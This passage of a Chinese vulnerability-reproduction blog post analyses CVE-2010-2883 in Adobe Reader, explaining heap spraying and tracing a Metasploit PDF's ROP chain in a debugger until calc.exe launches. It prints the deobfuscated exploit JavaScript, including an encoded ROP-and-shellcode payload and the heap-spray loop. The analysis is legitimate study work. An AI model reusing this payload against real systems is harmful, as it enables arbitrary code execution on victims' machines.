+<p>堆喷射：在堆空间申请大量的内存，填充类似 nop 之类的滑行指令与 shellcode，这样修改返回地址跳转到堆中的某个地址的时候滑行一段时间就能执行 shellcode（跳转到一堆滑行指令比起精准跳转到 shellcode 开头要容易）</p>
+<p>在 PDFStreamDumper 中查看一下 JS 代码：<br>（正常来说应该是搜索 javascript？对这个软件不太熟悉，在 object 12 中就有，不过变量名很奇怪，估计是 msf 为了绕过杀毒软件的检测）</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1608626876725-47b848f5-b67b-409f-b869-491b43a2cc3b.png#align=left&display=inline&height=464&margin=%5Bobject%20Object%5D&name=image.png&originHeight=714&originWidth=1047&size=106422&status=done&style=none&width=680" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>改一下变量名：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> shellcode = <span class="built_in">unescape</span>(</span><br><span class="line">  <span class="string">"%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000%uc9da%u74d9%uf424%u2958%ubdc9%u9b55%uab16%u31b1%u6831%u8318%ufce8%u6803%u7941%u57e3%uff81%ua80c%u6051%u4d84%ua060%u06f2%u10d2%u4a70%udbde%u7fd4%ua955%u70f0%u04de%ube27%u35df%ua11b%u4463%u0148%u875a%u409d%ufa9b%u106c%u7074%u85c2%uccf1%u2edf%uc049%ud267%ue319%u4546%uba12%u6748%ub6f7%u7fc0%uf214%uf49b%u88ee%udd1d%u703f%u20b1%u83f0%u65cb%u7c36%u9fbe%u0145%u5bb9%udd34%u784c%u969e%ua4f7%u7a1f%u2e61%u3713%u68e5%uc637%u032a%u4343%uc4cd%u17c2%uc0ea%ucc8f%u5193%ua275%u82ac%u1bd6%uc809%u48fa%u9320%u8f90%ua9b6%u90d6%ub1c8%uf946%u3af9%u7e09%ue906%u706e%ub04c%u19c6%u2009%u445b%u9eaa%u719f%u2b29%u865f%u5e31%uc25a%ub2f5%u5b16%ub490%u5c85%ud6b1%ucf48%u3759%u77ef%u47fb"</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">var</span> nopnop = <span class="built_in">unescape</span>(</span><br><span class="line">  <span class="string">"%"</span> + <span class="string">"u"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> + <span class="string">"%u"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> + <span class="string">"0"</span> + <span class="string">"c"</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">while</span> (nopnop.length + <span class="number">20</span> + <span class="number">8</span> &lt; <span class="number">65536</span>) nopnop += nopnop;</span><br><span class="line">var_a = nopnop.substring(<span class="number">0</span>, (<span class="number">0x0c0c</span> - <span class="number">0x24</span>) / <span class="number">2</span>);</span><br><span class="line">var_a += shellcode;</span><br><span class="line">var_a += nopnop;</span><br><span class="line">var_b = var_a.substring(<span class="number">0</span>, <span class="number">65536</span> / <span class="number">2</span>);</span><br><span class="line"><span class="keyword">while</span> (var_b.length &lt; <span class="number">0x80000</span>) var_b += var_b;</span><br><span class="line">var_c = var_b.substring(<span class="number">0</span>, <span class="number">0x80000</span> - (<span class="number">0x1020</span> - <span class="number">0x08</span>) / <span class="number">2</span>); <span class="comment">//到这里每个堆块中写的滑行代码+shellcode就确定了</span></span><br><span class="line"><span class="keyword">var</span> var_1 = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x1f0</span>; i++) var_1[i] = var_c + <span class="string">"s"</span>; <span class="comment">//这里就挨个放了前面定义好的代码了</span></span><br></pre></td></tr></table></figure>
+
+<p>之后 <code>pop ecx</code> 把 ‘UTF-32’ 的地址给了 ecx</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1608633445715-c11dbe2b-b68c-4cf9-a146-06e737a4bf78.png#align=left&display=inline&height=421&margin=%5Bobject%20Object%5D&name=image.png&originHeight=806&originWidth=1428&size=141745&status=done&style=none&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>然后把 eax 的值 0x12E6D0 保存到了里面</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1608560127655-4d070ca2-1eba-4927-a10f-c399aee11747.png#align=left&display=inline&height=64&margin=%5Bobject%20Object%5D&name=image.png&originHeight=65&originWidth=532&size=5083&status=done&style=none&width=523" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>在返回到 pop eax，把 CreateFileA 函数的地址放在 eax</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1608633907528-cd729ca7-b634-4957-b41f-f8a007feacae.png#align=left&display=inline&height=356&margin=%5Bobject%20Object%5D&name=image.png&originHeight=679&originWidth=1421&size=120992&status=done&style=none&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>返回后执行 jmp [eax] 去执行 CreateFileA</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1608634106188-86035a0b-39a7-4eee-871f-1c6b7ccb781a.png#align=left&display=inline&height=41&margin=%5Bobject%20Object%5D&name=image.png&originHeight=41&originWidth=489&size=3530&status=done&style=none&width=489" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>以隐藏的方式创建了一个临时文件，创建了一个文件，名字是：iso88951</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1608634337611-2491aec9-1db9-46e6-b99a-b4195ae1b6c1.png#align=left&display=inline&height=183&margin=%5Bobject%20Object%5D&name=image.png&originHeight=184&originWidth=505&size=14580&status=done&style=none&width=501" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>依次执行了 CreateFileMappingA 创建文件映射对象</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1608635292407-670a58ef-ffd7-4be2-b929-4a649251e748.png#align=left&display=inline&height=148&margin=%5Bobject%20Object%5D&name=image.png&originHeight=166&originWidth=559&size=13967&status=done&style=none&width=500" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>MapViewOfFile 将文件映射对象映射到当前程序的地址空间</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1608635421324-7786b297-8865-49da-b8b3-29244fc73e8b.png#align=left&display=inline&height=143&margin=%5Bobject%20Object%5D&name=image.png&originHeight=145&originWidth=504&size=11450&status=done&style=none&width=496" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>memcpy 把 shellcode 写到 MapViewOfFile 返回的可读可写可执行的地址</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1608635695967-62d5cae6-29ba-4ea8-b309-ccab971785c5.png#align=left&display=inline&height=105&margin=%5Bobject%20Object%5D&name=image.png&originHeight=105&originWidth=366&size=7033&status=done&style=none&width=366" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>接下来就可以正常的执行 shellcode 了</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1608641102779-66030a61-fbf1-4936-b131-09f0f8cb389f.png#align=left&display=inline&height=318&margin=%5Bobject%20Object%5D&name=image.png&originHeight=653&originWidth=1532&size=158626&status=done&style=stroke&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>经过一段循环之后在内存中可以看到 calc.exe 了</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1608641745995-256584a3-fd7a-47e6-87cb-5ba7d8bc93af.png#align=left&display=inline&height=421&margin=%5Bobject%20Object%5D&name=image.png&originHeight=803&originWidth=1424&size=132857&status=done&style=none&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>因为要通过 WinExec 来运行 calc.exe，直接 ctrl+g 来到 WinExec 代码那里下个断点，直接 F9 运行起来就会断住</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1608642004663-894dc171-acef-4f65-906a-1a3e2c28bf86.png#align=left&display=inline&height=85&margin=%5Bobject%20Object%5D&name=image.png&originHeight=85&originWidth=499&size=7211&status=done&style=none&width=499" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>再运行的话计算器就弹出来了</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1608642095734-4817368c-b50f-4be5-bdbf-4f2a36007a75.png#align=left&display=inline&height=253&margin=%5Bobject%20Object%5D&name=image.png&originHeight=253&originWidth=259&size=17332&status=done&style=none&width=259" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>参考：<br><a href="https://bbs.pediy.com/thread-257172.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-257172.htm</a><br><a href="https://bbs.pediy.com/thread-251801.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-251801.htm</a><br><a href="https://www.sunxiaokong.xyz/2019-08-30/lzx-01/" target="_blank" rel="noopener">https://www.sunxiaokong.xyz/2019-08-30/lzx-01</a><br><a href="https://my.oschina.net/u/3281747/blog/1789733" target="_blank" rel="noopener">https://my.oschina.net/u/3281747/blog/1789733</a></p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2020-12-29T01:58:38.882Z" itemprop="dateUpdated">2020-12-29 09:58:38</time>
+</span><br>
+
+
+        
+    </div>
+    
+    <footer>
+        <a href="https://yichen115.github.io">
+            <img src="/img/avatar.png" alt="yichen">
+            yichen
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://yichen115.github.io/2020/12/20/rfnt46/&title=《[CVE-2010-2883]Adobe Reader TTF 字体SING表栈溢出漏洞》 — yichen's blog&pic=https://yichen115.github.io/img/avatar.png" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://yichen115.github.io/2020/12/20/rfnt46/&title=《[CVE-2010-2883]Adobe Reader TTF 字体SING表栈溢出漏洞》 — yichen's blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://yichen115.github.io/2020/12/20/rfnt46/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《[CVE-2010-2883]Adobe Reader TTF 字体SING表栈溢出漏洞》 — yichen's blog&url=https://yichen115.github.io/2020/12/20/rfnt46/&via=https://yichen115.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://yichen115.github.io/2020/12/20/rfnt46/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2020/12/23/hzyxvk/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">[CVE-2010-3333]Microsoft Office RTF 文件 pFragments 属性栈缓冲区溢出漏洞</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2020/12/20/zpobg8/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">软件漏洞复现</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        谢谢大爷~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.jpg" data-alipay="/img/alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>yichen &copy; 2020</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://yichen115.github.io/2020/12/20/rfnt46/&title=《[CVE-2010-2883]Adobe Reader TTF 字体SING表栈溢出漏洞》 — yichen's blog&pic=https://yichen115.github.io/img/avatar.png" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://yichen115.github.io/2020/12/20/rfnt46/&title=《[CVE-2010-2883]Adobe Reader TTF 字体SING表栈溢出漏洞》 — yichen's blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://yichen115.github.io/2020/12/20/rfnt46/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《[CVE-2010-2883]Adobe Reader TTF 字体SING表栈溢出漏洞》 — yichen's blog&url=https://yichen115.github.io/2020/12/20/rfnt46/&via=https://yichen115.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://yichen115.github.io/2020/12/20/rfnt46/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="//api.qrserver.com/v1/create-qr-code/?data=https://yichen115.github.io/2020/12/20/rfnt46/" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '记得回来啊！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '欢迎回来!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
